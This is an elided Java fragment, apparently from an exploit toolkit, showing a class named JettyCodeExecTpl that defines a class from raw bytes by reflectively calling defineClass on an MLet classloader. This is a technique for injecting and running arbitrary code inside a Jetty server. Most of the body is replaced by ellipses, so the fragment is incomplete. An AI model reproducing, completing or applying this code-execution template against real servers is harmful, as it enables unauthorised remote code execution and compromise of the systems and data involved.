package com.h2tg.ysogate.template.jetty;
...
public class JettyCodeExecTpl {
    ...
    private String exec(String var2) {
        try {
            ...
            Class clazz = (Class) defineClass.invoke(new javax.management.loading.MLet(new java.net.URL[0], Thread.currentThread().getContextClassLoader()), clazzByte, 0, clazzByte.length);
